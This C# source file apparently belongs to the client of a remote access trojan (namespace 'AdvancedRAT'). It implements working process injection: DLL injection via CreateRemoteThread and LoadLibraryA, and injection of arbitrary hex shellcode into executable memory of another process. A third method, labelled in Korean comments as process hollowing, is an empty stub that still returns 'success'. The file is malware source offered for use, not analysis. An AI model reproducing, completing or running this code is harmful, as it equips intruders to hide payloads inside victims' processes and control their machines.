using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;

namespace AdvancedRAT.Client.Handlers
{
    public class InjectionHandler
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        
        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        
        [DllImport("kernel32.dll")]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
        
        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
        
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        
        [DllImport("kernel32.dll")]
        private static extern bool CloseHandle(IntPtr hObject);
        
        private const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const uint PAGE_READWRITE = 0x04;
        
        public async Task<object> InjectDLL(int pid, string dllPath)
        {
            try
            {
                IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
                if (hProcess == IntPtr.Zero)
                {
                    return new { success = false, message = "Failed to open process" };
                }
                
                byte[] dllPathBytes = Encoding.ASCII.GetBytes(dllPath);
                IntPtr allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dllPathBytes.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                
                if (allocMemAddress == IntPtr.Zero)
                {
                    CloseHandle(hProcess);
                    return new { success = false, message = "Failed to allocate memory" };
                }
                
                bool written = WriteProcessMemory(hProcess, allocMemAddress, dllPathBytes, (uint)dllPathBytes.Length, out int bytesWritten);
                if (!written)
                {
                    CloseHandle(hProcess);
                    return new { success = false, message = "Failed to write memory" };
                }
                
                IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                if (loadLibraryAddr == IntPtr.Zero)
                {
                    CloseHandle(hProcess);
                    return new { success = false, message = "Failed to get LoadLibraryA address" };
                }
                
                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, out IntPtr threadId);
                if (hThread == IntPtr.Zero)
                {
                    CloseHandle(hProcess);
                    return new { success = false, message = "Failed to create remote thread" };
                }
                
                CloseHandle(hThread);
                CloseHandle(hProcess);
                
                return new { success = true, message = $"DLL injected into process {pid}" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> InjectShellcode(int pid, string shellcodeHex)
        {
            try
            {
                byte[] shellcode = HexStringToByteArray(shellcodeHex);
                
                IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
                if (hProcess == IntPtr.Zero)
                {
                    return new { success = false, message = "Failed to open process" };
                }
                
                IntPtr allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                
                if (allocMemAddress == IntPtr.Zero)
                {
                    CloseHandle(hProcess);
                    return new { success = false, message = "Failed to allocate memory" };
                }
                
                bool written = WriteProcessMemory(hProcess, allocMemAddress, shellcode, (uint)shellcode.Length, out int bytesWritten);
                if (!written)
                {
                    CloseHandle(hProcess);
                    return new { success = false, message = "Failed to write shellcode" };
                }
                
                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocMemAddress, IntPtr.Zero, 0, out IntPtr threadId);
                if (hThread == IntPtr.Zero)
                {
                    CloseHandle(hProcess);
                    return new { success = false, message = "Failed to create remote thread" };
                }
                
                CloseHandle(hThread);
                CloseHandle(hProcess);
                
                return new { success = true, message = $"Shellcode injected into process {pid}" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> InjectPE(int pid, dynamic data)
        {
            try
            {
                // Process Hollowing / RunPE 구현
                // PE 헤더 파싱, 메모리 할당, 섹션 매핑, 재배치, IAT 수정 등
                
                return new { success = true, message = "PE injection attempted" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        private byte[] HexStringToByteArray(string hex)
        {
            hex = hex.Replace(" ", "").Replace("-", "").Replace("0x", "");
            int length = hex.Length;
            byte[] bytes = new byte[length / 2];
            
            for (int i = 0; i < length; i += 2)
            {
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            }
            
            return bytes;
        }
    }
}
